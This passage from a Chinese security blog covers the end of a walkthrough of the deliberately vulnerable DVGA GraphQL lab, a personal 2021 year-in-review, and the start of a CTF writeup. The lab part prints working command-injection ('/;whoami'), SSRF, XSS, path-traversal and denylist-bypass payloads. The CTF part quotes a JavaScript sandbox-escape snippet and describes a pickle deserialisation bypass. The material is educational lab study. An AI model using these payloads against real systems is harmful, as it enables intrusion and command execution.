field 字段时，graphql 会提示与这个字段相似的字段名称</p><p>输入</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  system</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;errors&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;message&quot;</span>: <span class="string">&quot;Cannot query field \&quot;system\&quot; on type \&quot;Query\&quot;. Did you mean \&quot;pastes\&quot;, \&quot;paste\&quot;, \&quot;systemUpdate\&quot; or \&quot;systemHealth\&quot;?&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;locations&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;line&quot;</span>: <span class="number">2</span>,</span><br><span class="line">          <span class="attr">&quot;column&quot;</span>: <span class="number">3</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见回显了 system 相关的一些接口</p><p>利用工具：</p><p><a href="https://github.com/nikitastupin/clairvoyance">https://github.com/nikitastupin/clairvoyance</a></p><h2 id="信息泄漏-SSRF"><a href="#信息泄漏-SSRF" class="headerlink" title="信息泄漏 - SSRF"></a>信息泄漏 - SSRF</h2><p><code>importPaste</code> mutation 用到了 curl 探测主机存活</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mutation &#123;</span><br><span class="line">    importPaste(host: <span class="string">&quot;127.0.0.1&quot;</span>, port: <span class="number">80</span>, path: <span class="string">&quot;/&quot;</span>, scheme: <span class="string">&quot;http&quot;</span>) &#123;</span><br><span class="line">        result</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要是熟悉下 mutation 的请求方式</p><h2 id="注入类-命令-amp-XSS-amp-HTML注入"><a href="#注入类-命令-amp-XSS-amp-HTML注入" class="headerlink" title="注入类 - 命令 &amp; XSS &amp; HTML注入"></a>注入类 - 命令 &amp; XSS &amp; HTML注入</h2><p>第1个命令注入：<code>importPaste</code> mutation 直接使用命令拼接</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mutation &#123;</span><br><span class="line">    importPaste(host: <span class="string">&quot;127.0.0.1&quot;</span>, port: <span class="number">80</span>, path: <span class="string">&quot;/;whoami&quot;</span>, scheme: <span class="string">&quot;http&quot;</span>) &#123;</span><br><span class="line">        result</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同 ssrf 熟悉下 mutation 的请求方式</p><p>第2个命令注入：postman写好挂个上游代理到burp爆破出密码（或者 graphiql 写好burp抓包均可），然后传入cmd命令执行即可</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    systemDiagnostics(username: <span class="string">&quot;admin&quot;</span>, password: <span class="string">&quot;admin123&quot;</span>, cmd: <span class="string">&quot;whoami&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里注意每次启动，password 都会从下面几个中随机选一个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;changeme&#x27;</span>, <span class="string">&#x27;password54321&#x27;</span>, <span class="string">&#x27;letmein&#x27;</span>, <span class="string">&#x27;admin123&#x27;</span>, <span class="string">&#x27;iloveyou&#x27;</span>, <span class="string">&#x27;00000000&#x27;</span>]</span><br></pre></td></tr></table></figure><p><img src="/img/graphql-dvga/image-20220128175651539.png" class="lazyload" data-srcset="/img/graphql-dvga/image-20220128175651539.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220128175651539"></p><p>XSS：在页面 Create Paste 插入XSS代码即可</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">console.log(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>HTML 注入，与XSS一样，即注入 HTML 代码</p><h2 id="注入类-日志欺骗"><a href="#注入类-日志欺骗" class="headerlink" title="注入类 - 日志欺骗"></a>注入类 - 日志欺骗</h2><p>日志记录通过 <code>Audit.create_audit_entry(gqloperation=helpers.get_opname(info.operation))</code> 记录日志，断点跟进 <code>helpers.get_opname</code> 方法，可知最终获取到的为操作名称，如果获取不到，则记录为 <code>&quot;No Operation&quot;</code>。比如</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">query pwned &#123;</span><br><span class="line">  systemHealth</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>记录为 <code>pwned</code></p><p><img src="/img/graphql-dvga/image-20220126224219767.png" class="lazyload" data-srcset="/img/graphql-dvga/image-20220126224219767.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220126224219767"></p><p> <code>CreatePaste</code> 通过抓包可以发现请求包为 <code>mutation CreatePaste (....</code> 直接改包会发现请求解析有问题或者日志篡改不了。通过自己构造请求 </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mutation nonoPaste &#123;</span><br><span class="line">    createPaste (title: <span class="string">&quot;good&quot;</span>, content: <span class="string">&quot;oah&quot;</span>, public: <span class="literal">true</span>, burn: <span class="literal">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      paste &#123;</span><br><span class="line">          pId</span><br><span class="line">          content</span><br><span class="line">          title</span><br><span class="line">          burn</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br></pre></td></tr></table></figure><p>则可以把日志篡改为 <code>nonoPaste</code></p><p><img src="/img/graphql-dvga/image-20220126225820428.png" class="lazyload" data-srcset="/img/graphql-dvga/image-20220126225820428.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220126225820428"></p><p>Emmm，其实专家模式也有点问题，虽然指定了白名单，但</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mutation getPastes &#123;</span><br><span class="line">    createPaste (title: <span class="string">&quot;good&quot;</span>, content: <span class="string">&quot;oaaaaah&quot;</span>, public: <span class="literal">true</span>, burn: <span class="literal">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      paste &#123;</span><br><span class="line">          pId</span><br><span class="line">          content</span><br><span class="line">          title</span><br><span class="line">          burn</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br></pre></td></tr></table></figure><p>这样子还是记录错日志了啊（</p><h2 id="认证绕过-graphiql-界面保护-bypass"><a href="#认证绕过-graphiql-界面保护-bypass" class="headerlink" title="认证绕过 - graphiql 界面保护 bypass"></a>认证绕过 - graphiql 界面保护 bypass</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IGQLProtectionMiddleware</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"><span class="meta">  @run_only_once</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">resolve</span>(<span class="params">self, <span class="built_in">next</span>, root, info, **kwargs</span>):</span></span><br><span class="line">    <span class="keyword">if</span> helpers.is_level_hard():</span><br><span class="line">      <span class="keyword">raise</span> werkzeug.exceptions.SecurityError(<span class="string">&#x27;GraphiQL is disabled&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    cookie = request.cookies.get(<span class="string">&#x27;env&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> cookie <span class="keyword">and</span> cookie == <span class="string">&#x27;graphiql:enable&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">next</span>(root, info, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> werkzeug.exceptions.SecurityError(<span class="string">&#x27;GraphiQL Access Rejected&#x27;</span>)</span><br></pre></td></tr></table></figure><p>在 信息泄漏 - 开发环境 ，其实虽然 graphiql 页面可以访问，但其实是用不了的，如上代码段，保护方式为获取Cookie env字段是否为 <code>graphiql:enable</code></p><h2 id="查询黑名单-bypass"><a href="#查询黑名单-bypass" class="headerlink" title="查询黑名单 bypass"></a>查询黑名单 bypass</h2><p>这一关需要修改一下 core/views.py 文件，注释 OpNameProtectionMiddleware 中间件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gql_middlew = [</span><br><span class="line">  middleware.CostProtectionMiddleware(),</span><br><span class="line">  middleware.DepthProtectionMiddleware(),</span><br><span class="line">  middleware.IntrospectionMiddleware(),</span><br><span class="line">  middleware.processMiddleware(),</span><br><span class="line">  <span class="comment"># middleware.OpNameProtectionMiddleware()</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">processMiddleware</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">resolve</span>(<span class="params">self, <span class="built_in">next</span>, root, info, **kwargs</span>):</span></span><br><span class="line">    <span class="keyword">if</span> helpers.is_level_easy():</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">next</span>(root, info, **kwargs)</span><br><span class="line"></span><br><span class="line">    array_qry = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> info.context.json <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">isinstance</span>(info.context.json, <span class="built_in">dict</span>):</span><br><span class="line">        array_qry.append(info.context.json)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> q <span class="keyword">in</span> array_qry:</span><br><span class="line">        query = q.get(<span class="string">&#x27;query&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> security.on_denylist(query):</span><br><span class="line">          <span class="keyword">raise</span> werkzeug.exceptions.SecurityError(<span class="string">&#x27;Query is on the Deny List.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">next</span>(root, info, **kwargs)</span><br></pre></td></tr></table></figure><p>因 <code>on_denylist</code> 方法通过分割空白字符后拼接在判断查询是否在黑名单内</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_denylist</span>(<span class="params">query</span>):</span></span><br><span class="line">  normalized_query = <span class="string">&#x27;&#x27;</span>.join(query.split())</span><br><span class="line">  queries = [</span><br><span class="line">    <span class="string">&#x27;query&#123;systemHealth&#125;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&#123;systemHealth&#125;&#x27;</span></span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> normalized_query <span class="keyword">in</span> queries:</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>当然查询为 </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">query good&#123;</span><br><span class="line">    systemHealth</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就会变成 <code>querygood&#123;systemHealth&#125;</code> 进而避开黑名单</p><h2 id="杂项-目录穿越"><a href="#杂项-目录穿越" class="headerlink" title="杂项 - 目录穿越"></a>杂项 - 目录穿越</h2><p>普通目录穿越</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mutation &#123;</span><br><span class="line">  uploadPaste(filename:<span class="string">&quot;../../../../../tmp/file.txt&quot;</span>, content:<span class="string">&quot;hi&quot;</span>)&#123;</span><br><span class="line">    result</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>除了配置不当、越权或未授权，这个靶场没咋提及，tari感觉拒绝服务相对来说在GraphQL中算是比较有特色些的问题了</p><p>当然除了靶场中涉及的，还有像GraphQL注入、CSRF也是不错的姿势，不过靶场没涉及，有兴趣的通过可以戳</p><p><a href="https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ">https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ</a></p><p>tari也是刚接触GraphQL不久，欢迎交流～</p>]]></content>
      
      
      <categories>
          
          <category> GraphQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GraphQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>告别2021</title>
      <link href="//p/2021/2021summury/"/>
      <url>//p/2021/2021summury/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>本来想着春节在写的，看到大家都写了，跟风一下，2333</p><h2 id="3-5月-毕设-amp-论文"><a href="#3-5月-毕设-amp-论文" class="headerlink" title="3-5月 毕设&amp;论文"></a>3-5月 毕设&amp;论文</h2><p>年后先回公司两周，实习期满3月后回校开始做毕设和写论文，因实习期间做Python代码审计较多，想着能否编写一个静态代码扫描工具提升工作效率甚至挖出多点洞，这个想法其实在去年年末就有了，开题报告也整的这个但是一直没开始，想着实习走人后开始进行。</p><p>3月6号，差不到回到学校门口就下起大雨，然后伞在实习那会，刚好放在共享单车，丢了。室友全困在饭堂，笑到我了，期间联系到个师弟前来救助，不过最后还是其中一个室友借助某熟人伞回到宿舍最后接我回去～回到宿舍第一件事就是开启我的台式，然后因为天气潮湿，我用湿布插了机箱，没干，<code>开机显卡烧了....为我955写毕设打下良好的基础....</code></p><p>最开始的一个月主要是研究 <a href="https://github.com/PyCQA/bandit">bandit</a> 源码，看懂AST咋解析的，规则咋加载和准确（相较直接正则）判断的，插件化和整体框架，后面就开始照猫画虎写了。期间每天晚上（只要不下雨）就去跑半小时步，被室友拉去打打羽毛球，早睡早起，为我后面减肥成功打下坚实的基础！做毕设期间摸摸鱼刷刷 ctfshow，复现复现漏洞，日子过的轻松愉悦简单而充实～</p><p>过了接近一个月，才写完核心部分，论文还没开始动开始慌了，看到同个导师的其他同学都给论文老检查，马不停蹄开始加快进度，终于在一周内把边边角角写好，后续开始对比SonarQube，Fortify 这些优秀的代码审计工具，也是为论文数据部分做准备。不得不吐槽下Fortify，扫描几十万行代码，16核+32G竟然扫了差不多24小时… 后面花了1周多时间完成论文大体内容。<code>论文查重率不到1%，导师看我工具对比商业工具和开源工具做审计Python都有不错的优势，于是让我准备一下申请优秀论文和毕设</code>，顿时感觉这两个多月来的付出有些回报，又开始整精简版，英文版，丰富一下论文数据，和完善一波工具代码和强化一下工具的实际应用场景，<code>如集成在DevSecOps下</code>。虽然有一部分原因是因为没啥时候写UI了（评委老师都喜欢花里胡哨的界面），开始<code>把Gitlab、Jenkins和SonarQube搭建起来，模仿企业的流水线并跑通，让工具更具有工程意义</code>。<code>最后也拿下了优秀毕业论文和毕设</code>，这里非常感谢我导师，<code>半夜4，5点</code>还发消息告诉我改这改那（：</p><p>总体来说，做完这次毕设，收获真的很大，完整看完一个优秀的开源项目，真的学到了很多，以前我觉得我学的Python都是假的。</p><h2 id="6月-放飞自我"><a href="#6月-放飞自我" class="headerlink" title="6月 放飞自我"></a>6月 放飞自我</h2><p>其实5月初毕设和论文大体搞定，这时也在摸鱼和工作室小伙伴经常参加CTF了，有过大三渗透实习和前面实习在加上这两个多月多了好几套题，这会终于不像大一二那会，啥题都不会做了，<code>参加了第一届广东省大学生网络安全大赛，终于第一次过了CTF初赛，后面决赛AWD，最终拿下省赛总决赛二等奖</code>，师弟也超级给力。也算是完成了自己开始学网安以来，拿一次奖的心愿～ </p><p>期间也参加了<code>2021第四届中国强网杯，排名前10%，拿了个强网先锋证书</code>。虽然成绩不算特别好，但是自己带飞队友的感觉，真的很爽！第一次在国赛解出这么多题目～ 而且国赛的一个AST题目和我毕设息息相关，哈哈</p><p>期间也陆陆续续参加大大小小的CTF，就没试过没解出来题目的，感觉CTF能勤奋刷题，能有方法刷题，也没有那么的难，<code>以前还是刷题太少了</code>，23333</p><h2 id="7-9月-入职-amp-CTF训练营-amp-转正"><a href="#7-9月-入职-amp-CTF训练营-amp-转正" class="headerlink" title="7-9月 入职 &amp; CTF训练营 &amp; 转正"></a>7-9月 入职 &amp; CTF训练营 &amp; 转正</h2><p>想起期间我实习导师还经常问我有没有面其他厂，生怕我跑路了一样，2333。入职期间，因为有过实习经验，工作也比较顺心应手。入职一开始编制是在创新研究院，但实习期间感觉私有云和托管云也挺有兴趣的，之前组长也有说后续会在我们这边专门整个云安全相关团队，后面找了组长，组长帮忙调了过来。</p><p>回到学校这边，想着把学校的CTF搞起来，利用业务时间和工作室几位伙伴一起整了个 <a href="https://www.yuque.com/fosusec/ctfcamp">CTF暑期打卡计划</a> （共2个月），希望能把一些东西传承下去吧，怎么说呢师弟师妹们其实积极性也还算好，我这边跟进的也算可以，看每周总结，任务啥的基本不会咕，也很到位，平台也是自费掏钱买的，CTF我相对熟点，带的自我感觉也还算好吧也很用心，也会把展示很多实战案例。后面的渗透 <a href="https://www.yuque.com/challenger-sfhjb/blog">Challenger</a>，带的很好，内容很干货。其实一切都还好，大家也都挺有激情，期间也没有同学退出。从训练营来说，好像也没啥地方有什么差错。<code>就是完成后，我们没有下任务后，也就是现在看来，Web这边后续能够自己持续学习的，持续交流的基本没有，也挺可惜的吧</code>。</p><p>在回到工作，一方面在同产品线有实习经历了，然后毕设也和公司效能提升，走DevSecOps一致，各种产出也勉强看的过去，导师<code>也推荐我提前转正</code>，后面没想到的就是，<code>大佬们也给我评了优秀转正</code>，感谢各位大佬在我试用期期间带飞。</p><h2 id="10-12月-上班dog的业余"><a href="#10-12月-上班dog的业余" class="headerlink" title="10-12月 上班dog的业余"></a>10-12月 上班dog的业余</h2><p>国庆回家，最让我惊喜的是，可能这几个月来一直坚持运动和良好作息，某天去朋友家看到秤称了一下，竟然瘦下来了，怪不得个个看到我都说我瘦了，<code>体重直接从 160 到 138 ！</code></p><p>9月的时候，其实已经和几位同事大佬组了个小团队，打打CTF的，到11月打了几次成绩也还可以～，<code>比如羊城杯也企业组13名</code>，2021第四届“强网“拟态防御国际精英挑战赛，<code>人生第一次和队友一起AK Web！</code>，6个，我解了3个这样子。</p><p>但不知为啥AK后就开始萎靡不振，开始其他方向，（可能老底吃尽了，前面也没啥时间刷题，光着搞传承去了，刷题少了），这时 Challenger 师傅推荐我去挖众测，他手把手带飞我。之前也想过要不要做点什么副业，有另外一份收入。从目前挖了1个多月来看，收入也还算可观吧～ 虽然比起大佬们差远了。</p><p>第一个项目运气比较好，交了挺多洞，，就被 <a href="https://www.xffbk.cn/">西瓜🍉师傅</a> 找上门来了，问我要不要去他团队耍耍。团队也挺多大佬的，平常我主要帮忙打打杂，偶尔听听大佬们分享，我甚至还把我和同事原本组的小团队都给撬过来了（逃</p><h2 id="游玩"><a href="#游玩" class="headerlink" title="游玩"></a>游玩</h2><ul><li><p>莲花山公园，校招小分队</p></li><li><p>白云山，和室友去浪</p></li><li><p>东门+文和友，和同学去的时候比较晚，很多店面都关门了，23333</p></li><li><p>沙趴看海，和好基友看日落，吃海鲜</p></li><li><p>仙湖植物园，和同学去拜佛.jpg</p></li><li><p>地王大厦69层看深圳夜景，久违面基</p></li><li><p>欢乐港湾滨海文化公园，和同事去逛逛</p></li><li><p>吃的倒是挺多的（</p></li></ul><p>照骗放张和好基友去看日落的，原来家里那边的海还挺好看，2333</p><p><img src="/img/2021summury/IMG_0064-0967205.jpg" class="lazyload" data-srcset="/img/2021summury/IMG_0064-0967205.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="IMG_0064"></p><h2 id="目标达成"><a href="#目标达成" class="headerlink" title="目标达成"></a>目标达成</h2><p>回顾一些flag，基本没有一个全部拔掉的，都是做着做着，被其他东西搞去了</p><ul><li><input disabled="" type="checkbox"> SDL，把实习学的做个总结并做一些拓展，60%</li><li><input disabled="" type="checkbox"> 云安全，先把威胁建模学个差不多，然后熟悉一波主流的云基础框架，毕竟工作要用到，30%</li><li><input disabled="" type="checkbox"> 二进制，常见漏洞点和利用方式要掌握，感觉熟悉二进制以后审计C/C++会舒服不少，40%</li><li><input disabled="" type="checkbox"> 代码审计，把白嫖过来的CTFSHOW入门大部分给刷完，巩固一波基础~ 20%</li><li><input disabled="" type="checkbox"> 刷完sqli-lab靶场，30%</li><li><input disabled="" type="checkbox"> bypass disable function 所有场景实操，0%</li></ul><p>完成了一直以来想完成的心愿，也是今年带给我的一些惊喜吧～</p><ul><li><input checked="" disabled="" type="checkbox"> CTF Web AK</li><li><input checked="" disabled="" type="checkbox"> CTF 带飞队友</li><li><input checked="" disabled="" type="checkbox"> CTF打进决赛并获奖</li></ul><p>第一次做Github给不认识的提PR，向Oneforall 修复了2个Bug，也第一次收到了别人的PR，然后自己也整了个wx机器人玩玩啥的，还挺不错</p><p>感谢今年各位带飞，今年达成的心愿，获的的奖，得到的成长，得到的开心，感觉一个人真心啥都干不好.jpg</p><h2 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h2><p>又到了立 flag 环节</p><ul><li><input disabled="" type="checkbox"> 考 PTS</li><li><input disabled="" type="checkbox"> 考 CISP</li><li><input disabled="" type="checkbox"> 读完 frp 源码，巩固Go，并针对红队使用场景做一些优化</li><li><input disabled="" type="checkbox"> sqlilab靶场（这次一定</li></ul>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
          <category> 小记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小记 </tag>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021第四届“强网”拟态防御国际精英挑战赛 Writeup</title>
      <link href="//p/2021/2021nitai/"/>
      <url>//p/2021/2021nitai/</url>
      
        <content type="html"><![CDATA[<p>又和几个**”社会”**人士一起组队参加了这次比赛</p><p>这次 Web 和队友一起 AK了，开心 23333</p><p>（想起来以前一个题都做不出来的画面…</p><p>部分题目下载链接：</p><ul><li><a href="/static/2021/10/26/2021nitai-misc.7z">2021nitai-misc.7z</a></li><li><a href="/static/2021/10/26/2021nitai-web.7z">2021nitai-web.7z</a></li><li><a href="/static/2021/10/26/2021nitai-crypto.7z">2021nitai-crypto.7z</a></li></ul><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="0x1-zerocalc"><a href="#0x1-zerocalc" class="headerlink" title="0x1 zerocalc"></a>0x1 zerocalc</h3><p><a href="https://tari.moe/">@tari</a> <a href="https://www.cnblogs.com/DEADF1SH-CAT/">@DEADF1SH-CAT</a></p><p>把能下的都下下来，特别是 package.json，一开始忘了下了晕，然后 <a href="https://snyk.io/">snyk</a> 一下扫出两个，感觉是</p><p><a href="https://snyk.io/vuln/SNYK-JS-NOTEVIL-608878">https://snyk.io/vuln/SNYK-JS-NOTEVIL-608878</a></p><p>因为本地调试直接用safeEval可以利用到nodejs的Function对象，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> code = <span class="string">&quot;function fn() &#123;&#125;;var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__).constructor;var properties = Object.values(constructorProperty);properties.pop();properties.pop();properties.pop();properties.pop();&quot;</span></span><br><span class="line"><span class="built_in">console</span>.log(safeEval(code))</span><br></pre></td></tr></table></figure><p>不过加了题目的safeEval就是跑到就被拦截</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//<span class="doctag">HACK:</span> esprima doesn&#x27;t like returns outside functions</span></span><br><span class="line">src = parse(<span class="string">&#x27;function a()&#123;&#x27;</span> + src + <span class="string">&#x27;&#125;&#x27;</span>).body[<span class="number">0</span>].body</span><br></pre></td></tr></table></figure><p>不知咋绕过</p><p>后面不知被哪位大佬改了 flag 位置，就直接捡漏了，</p><p><img src="/img/2021nitai/image-20211025232552410.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025232552410.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025232552410"></p><h3 id="0x2-ezPickle"><a href="#0x2-ezPickle" class="headerlink" title="0x2 ezPickle"></a>0x2 ezPickle</h3><p><a href="https://tari.moe/">@tari</a></p><p>查看题目源码发现是pickle反序列化的白名单+黑名单机制，并会动态加载其他模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> module <span class="keyword">in</span> [<span class="string">&#x27;config&#x27;</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br></pre></td></tr></table></figure><p>也就是说，只要引入到模块是 config，且不访问模块内置变量即可绕过pickle反序列化限制</p><p>config.py 中存在任意代码执行，只要想办法把 notadmin = {“admin”: “no”} 字典值篡改即可</p><p>通过编写OPCODE，在 backdoor 执行前修改 config 命名空间的 notadmin 字典值，这里可以借助工具在OPCODE中修改字典的值</p><p><a 